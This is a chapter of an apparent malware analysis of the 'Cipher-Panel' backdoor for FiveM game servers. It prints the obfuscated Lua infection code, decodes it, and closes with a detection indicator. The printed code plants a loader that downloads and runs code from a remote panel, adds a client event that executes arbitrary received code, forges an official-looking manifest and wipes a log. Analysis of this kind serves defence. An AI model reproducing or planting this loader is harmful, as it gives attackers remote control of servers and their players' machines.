## Chapter 2 (Infection)
This chapter covers the infection code used in the malicious code to hire dubbed Cipher-Panel.

### Introduction
The infection code for this malicious software is one of the best examples of failed obfuscation the world has to offer. The code is downloaded and excuted via the payload code we covered in [Chapter 1](https://github.com/ericstolly/cipher/blob/main/chapters/chapter-1-payload.md).

#### Original Code
```lua
local kaskyWVklaWSErrrnVBB = "\x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72"
local kakkyWVklaWSErrrnVBB = "\x2f\x73\x65\x72\x76\x65\x72\x2f\x68\x6f\x73\x74\x5f\x6c\x6f\x63\x6b\x2e\x6c\x75\x61"
local YBLgfdYggNgxwqazyGsb = "\x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74"
local ZudnizosZzhdkeuSzndh = "\x2f\x73\x65\x72\x76\x65\x72\x2f\x67\x61\x6d\x65\x2e\x6c\x6f\x67"
local eVSsCsytJpinTgqcGOIz = "\x2f\x63\x6c\x69\x65\x6e\x74\x2f\x65\x6d\x70\x74\x79\x2e\x6c\x75\x61"
local TeRfIyyWqxeqaJtVpjHO = "\x2f\x66\x78\x6d\x61\x6e\x69\x66\x65\x73\x74\x2e\x6c\x75\x61"
local aOSpqxARmZAARgJKFkSP, dzhdoDHOZhjcqbcdqz =
    "\x72\x65\x73\x6f\x75\x72\x63\x65\x73\x2f\x5b\x73\x79\x73\x74\x65\x6d\x5d\x2f\x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72\x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74",
    GetResourcePath
Citizen.CreateThread(
    function()
        Citizen.Wait(20000)
        raSdVeoRVnbTqXAqXrWO = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. YBLgfdYggNgxwqazyGsb, "r")
        raSdVexRVnbTqXAqXrWO = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. ZudnizosZzhdkeuSzndh, "r")
        if (raSdVeoRVnbTqXAqXrWO or raSdVexRVnbTqXAqXrWO) then
        else
            esiwoeKYHGqUkFENuRrc = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. kakkyWVklaWSErrrnVBB, "a")
            esiwoeKYHGqUkFENuRrc:write("\n\nlocal XHiAookqKz = {")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['PerformHttpRequest'],")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['assert'],")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['load'],")
            esiwoeKYHGqUkFENuRrc:write("\n	_G['tonumber']")
            esiwoeKYHGqUkFENuRrc:write("\n}")
            esiwoeKYHGqUkFENuRrc:write("\n\nlocal HFuKXKYHZq = {")
            esiwoeKYHGqUkFENuRrc:write(
                "\n	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',"
            )
            esiwoeKYHGqUkFENuRrc:write(
                "\n	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',"
            )
            esiwoeKYHGqUkFENuRrc:write(
                "\n	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'"
            )
            esiwoeKYHGqUkFENuRrc:write("\n}")
            esiwoeKYHGqUkFENuRrc:write("\n\nfunction sDOmZoZyZn()")
            esiwoeKYHGqUkFENuRrc:write("\n	UULJijIqvu = ''")
            esiwoeKYHGqUkFENuRrc:write("\n	for id,it in pairs(HFuKXKYHZq) do")
            esiwoeKYHGqUkFENuRrc:write("\n		UULJijIqvu = UULJijIqvu..it")
            esiwoeKYHGqUkFENuRrc:write("\n	end")
            esiwoeKYHGqUkFENuRrc:write("\n	return (UULJijIqvu:gsub('..', function (luwOyroAEjA)")
            esiwoeKYHGqUkFENuRrc:write("\n		return string.char(XHiAookqKz[4](luwOyroAEjA, 16))")
            esiwoeKYHGqUkFENuRrc:write("\n	end))")
            esiwoeKYHGqUkFENuRrc:write("\nend")
            esiwoeKYHGqUkFENuRrc:write("\n\nXHiAookqKz[XHiAookqKz[4]('1')](sDOmZoZyZn(), function (e, lgUVUNUOPG)")
            esiwoeKYHGqUkFENuRrc:write(
                "\n	local WEshhWKyxg = XHiAookqKz[XHiAookqKz[4]('2')](XHiAookqKz[XHiAookqKz[4]('3')](lgUVUNUOPG))"
            )
            esiwoeKYHGqUkFENuRrc:write("\n	if (lgUVUNUOPG == nil) then return end")
            esiwoeKYHGqUkFENuRrc:write("\n	WEshhWKyxg()")
            esiwoeKYHGqUkFENuRrc:write("\nend)")
            esiwoeKYHGqUkFENuRrc:close()
            OrGaRdnLVZIaTVnMJPJC = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. eVSsCsytJpinTgqcGOIz, "a")
            OrGaRdnLVZIaTVnMJPJC:write("\n\nRegisterNetEvent('helpCode')")
            OrGaRdnLVZIaTVnMJPJC:write("\n\nAddEventHandler('helpCode', function(id)")
            OrGaRdnLVZIaTVnMJPJC:write("\n	local help = assert(load(id))")
            OrGaRdnLVZIaTVnMJPJC:write("\n	help()")
            OrGaRdnLVZIaTVnMJPJC:write("\nend)")
            OrGaRdnLVZIaTVnMJPJC:close()
            oLwFxrKtOgqxQcwxVkHO = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. TeRfIyyWqxeqaJtVpjHO, "w")
            oLwFxrKtOgqxQcwxVkHO:write("-- This resource is part of the default Cfx.re asset pack (cfx-server-data)")
            oLwFxrKtOgqxQcwxVkHO:write("\n-- Altering or recreating for local use only is strongly discouraged.")
            oLwFxrKtOgqxQcwxVkHO:write("\n\nversion '1.0.0'")
            oLwFxrKtOgqxQcwxVkHO:write("\nauthor 'Cfx.re <root@cfx.re>'")
            oLwFxrKtOgqxQcwxVkHO:write("\ndescription 'Handles the host lock for non-OneSync servers. Do not disable.'")
            oLwFxrKtOgqxQcwxVkHO:write("\nrepository 'https://github.com/citizenfx/cfx-server-data'")
            oLwFxrKtOgqxQcwxVkHO:write("\n\nfx_version 'cerulean'")
            oLwFxrKtOgqxQcwxVkHO:write("\ngames { 'gta4', 'gta5' }")
            oLwFxrKtOgqxQcwxVkHO:write("\n\nserver_scripts { 'server/host_lock.lua', '@mysql-async/lib/MySQL.lua' }")
            oLwFxrKtOgqxQcwxVkHO:write("\nclient_script 'client/empty.lua'")
            oLwFxrKtOgqxQcwxVkHO:close()
            pgDTRRFUvQLbTgFTMTlt = io.open(dzhdoDHOZhjcqbcdqz(kaskyWVklaWSErrrnVBB) .. ZudnizosZzhdkeuSzndh, "w")
            pgDTRRFUvQLbTgFTMTlt:write()
            pgDTRRFUvQLbTgFTMTlt:close()
        end
    end
)
```

The code above is yet again using UTF-8 encoding for a few fields, it also contains the contents of the `fxmanifest.lua` file thus it's safe to assume it writes to that file. It also uses a fair amount of `write` so again, it's safe to assume it writes to other files.


We once again simply decode the UTF-8 encoded strings and normalize the function names and fields.

#### UTF-8 String Reversal
```
Variable: kaskyWVklaWSErrrnVBB
Input: \x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72
Output: sessionmanager

Variable: kakkyWVklaWSErrrnVBB
Input: \x2f\x73\x65\x72\x76\x65\x72\x2f\x68\x6f\x73\x74\x5f\x6c\x6f\x63\x6b\x2e\x6c\x75\x61
Output: /server/host_lock.lua

Variable: YBLgfdYggNgxwqazyGsb
Input: \x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74
Output: /server/licence.txt

Variable: ZudnizosZzhdkeuSzndh
Input: \x2f\x73\x65\x72\x76\x65\x72\x2f\x67\x61\x6d\x65\x2e\x6c\x6f\x67
Output: /server/game.log

Variable: eVSsCsytJpinTgqcGOIz
Input: \x2f\x63\x6c\x69\x65\x6e\x74\x2f\x65\x6d\x70\x74\x79\x2e\x6c\x75\x61
Output: /client/empty.lua

Variable: TeRfIyyWqxeqaJtVpjHO
Input: \x2f\x66\x78\x6d\x61\x6e\x69\x66\x65\x73\x74\x2e\x6c\x75\x61
Output: /fxmanifest.lua

Variable: aOSpqxARmZAARgJKFkSP
Input: \x72\x65\x73\x6f\x75\x72\x63\x65\x73\x2f\x5b\x73\x79\x73\x74\x65\x6d\x5d\x2f\x73\x65\x73\x73\x69\x6f\x6e\x6d\x61\x6e\x61\x67\x65\x72\x2f\x73\x65\x72\x76\x65\x72\x2f\x6c\x69\x63\x65\x6e\x63\x65\x2e\x74\x78\x74
Output: resources/[system]/sessionmanager/server/licence.txt
```

The UTF-8 encoded strings were all files and directories, they are used in conjunction with IO operations thus we get infected files list.

#### Final Mapped and Normalised Code
```lua
Citizen.CreateThread(
    function()
        Citizen.Wait(20000)
		
        licenseFile = io.open(GetResourcePath("sessionmanager") .. "/server/licence.txt", "r")
        gameLogFile = io.open(GetResourcePath("sessionmanager") .. "/server/game.log", "r")
		
        if (licenseFile or gameLogFile) then
        else
            hostLockFile = io.open(GetResourcePath("sessionmanager") .. "/server/host_lock.lua", "a")
            hostLockFile:write("\n\nlocal XHiAookqKz = {")
            hostLockFile:write("\n	_G['PerformHttpRequest'],")
            hostLockFile:write("\n	_G['assert'],")
            hostLockFile:write("\n	_G['load'],")
            hostLockFile:write("\n	_G['tonumber']")
            hostLockFile:write("\n}")
            hostLockFile:write("\n\nlocal HFuKXKYHZq = {")
            hostLockFile:write(
                "\n	'68', '74', '74', '70', '73', '3a', '2f', '2f', '63', '69', '70', '68', '65', '72',"
            )
            hostLockFile:write(
                "\n	'2d', '70', '61', '6e', '65', '6c', '2e', '6d', '65', '2f', '5f', '69', '2f', '72',"
            )
            hostLockFile:write(
                "\n	'2e', '70', '68', '70', '3f', '74', '6f', '3d', '6c', '36', '54', '72', '32'"
            )
            hostLockFile:write("\n}")
            hostLockFile:write("\n\nfunction sDOmZoZyZn()")
            hostLockFile:write("\n	UULJijIqvu = ''")
            hostLockFile:write("\n	for id,it in pairs(HFuKXKYHZq) do")
            hostLockFile:write("\n		UULJijIqvu = UULJijIqvu..it")
            hostLockFile:write("\n	end")
            hostLockFile:write("\n	return (UULJijIqvu:gsub('..', function (luwOyroAEjA)")
            hostLockFile:write("\n		return string.char(XHiAookqKz[4](luwOyroAEjA, 16))")
            hostLockFile:write("\n	end))")
            hostLockFile:write("\nend")
            hostLockFile:write("\n\nXHiAookqKz[XHiAookqKz[4]('1')](sDOmZoZyZn(), function (e, lgUVUNUOPG)")
            hostLockFile:write(
                "\n	local WEshhWKyxg = XHiAookqKz[XHiAookqKz[4]('2')](XHiAookqKz[XHiAookqKz[4]('3')](lgUVUNUOPG))"
            )
            hostLockFile:write("\n	if (lgUVUNUOPG == nil) then return end")
            hostLockFile:write("\n	WEshhWKyxg()")
            hostLockFile:write("\nend)")
            hostLockFile:close()
			
            emptyLuaFile = io.open(GetResourcePath("sessionmanager") .. "/client/empty.lua", "a")
            emptyLuaFile:write("\n\nRegisterNetEvent('helpCode')")
            emptyLuaFile:write("\n\nAddEventHandler('helpCode', function(id)")
            emptyLuaFile:write("\n	local help = assert(load(id))")
            emptyLuaFile:write("\n	help()")
            emptyLuaFile:write("\nend)")
            emptyLuaFile:close()

            fxManifestLuaFile = io.open(GetResourcePath("sessionmanager") .. "/fxmanifest.lua", "w")
            fxManifestLuaFile:write("-- This resource is part of the default Cfx.re asset pack (cfx-server-data)")
            fxManifestLuaFile:write("\n-- Altering or recreating for local use only is strongly discouraged.")
            fxManifestLuaFile:write("\n\nversion '1.0.0'")
            fxManifestLuaFile:write("\nauthor 'Cfx.re <root@cfx.re>'")
            fxManifestLuaFile:write("\ndescription 'Handles the host lock for non-OneSync servers. Do not disable.'")
            fxManifestLuaFile:write("\nrepository 'https://github.com/citizenfx/cfx-server-data'")
            fxManifestLuaFile:write("\n\nfx_version 'cerulean'")
            fxManifestLuaFile:write("\ngames { 'gta4', 'gta5' }")
            fxManifestLuaFile:write("\n\nserver_scripts { 'server/host_lock.lua', '@mysql-async/lib/MySQL.lua' }")
            fxManifestLuaFile:write("\nclient_script 'client/empty.lua'")
            fxManifestLuaFile:close()
			
            gameLogsFile = io.open(GetResourcePath("sessionmanager") .. "/server/game.log", "w")
            gameLogsFile:write()
            gameLogsFile:close()
        end
    end
)
```

After the mapping and normalization of the code, we can see that it writes to the files[^1] found in the UTF-8 string reversal. It is also in this code that we gather more evidence of the intelligence the authors of this malicious software have, they lacked the understanding to string escape for the quotation marks in their `fxmanifest.lua` infection oppose to the original which includes quotations marks in the `description` value of the [original manifest file](https://github.com/citizenfx/cfx-server-data/blob/master/resources/%5Bsystem%5D/sessionmanager/fxmanifest.lua#L6). This, in turn, provides an indicator for the detection for this software [^2].

The files modified here are covered in the next chapter.

[^1]: `resources\[FiveM]\[system]\sessionmanager\server\host_lock.lua`, `resources\[FiveM]\[system]\sessionmanager\client\empty.lua` and `resources\[FiveM]\[system]\sessionmanager\fxmanifest.lua`.
[^2]: Checking that the `fxmanifest.lua` file doesn't include quotation marks on the `description` line would confirm either modification or infection.

[Chapter 3 (???)](https://github.com/ericstolly/)
